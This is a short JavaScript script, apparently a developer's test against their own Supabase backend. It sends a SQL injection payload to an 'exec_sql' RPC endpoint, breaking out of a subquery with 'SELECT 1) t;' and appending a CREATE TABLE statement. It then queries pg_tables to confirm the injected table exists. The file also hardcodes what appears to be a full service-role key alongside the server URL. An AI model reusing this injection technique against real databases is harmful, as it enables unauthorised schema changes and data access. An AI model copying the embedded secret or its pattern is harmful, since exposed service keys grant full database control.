
const SUPABASE_URL = 'https://supabase.dmytrotovstytskyi.online';
const SERVICE_ROLE_KEY = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJzdXBhYmFzZSIsImlhdCI6MTc2MzI0OTcwMCwiZXhwIjo0OTE4OTIzMzAwLCJyb2xlIjoic2VydmljZV9yb2xlIn0.QC9C9-CxocHb-jM-lHmXHEjEZV2hCOaSwgfxKLjKoEQ';

async function main() {
    try {
        // Corrected Injection: SELECT 1) t; CREATE TABLE public.test_ddl_injection (id int); --
        // Resulting SQL: SELECT json_agg(row_to_json(t)) FROM (SELECT 1) t; CREATE TABLE public.test_ddl_injection (id int); --) t
        // Note: the --) t comment will disable whatever follows.
        const injectionQuery = "SELECT 1) t; CREATE TABLE public.test_ddl_injection (id int); --";

        const response = await fetch(`${SUPABASE_URL}/rest/v1/rpc/exec_sql`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'apikey': SERVICE_ROLE_KEY, 'Authorization': `Bearer ${SERVICE_ROLE_KEY}` },
            body: JSON.stringify({ query: injectionQuery })
        });
        const data = await response.json();
        console.log('Injection Result:', data);

        // Verify if table created
        const verifyQuery = "SELECT tablename FROM pg_tables WHERE tablename = 'test_ddl_injection'";
        const response2 = await fetch(`${SUPABASE_URL}/rest/v1/rpc/exec_sql`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'apikey': SERVICE_ROLE_KEY, 'Authorization': `Bearer ${SERVICE_ROLE_KEY}` },
            body: JSON.stringify({ query: verifyQuery })
        });
        const data2 = await response2.json();
        console.log('Verification Result:', data2);

    } catch (error) {
        console.error('Error:', error);
    }
}

main();
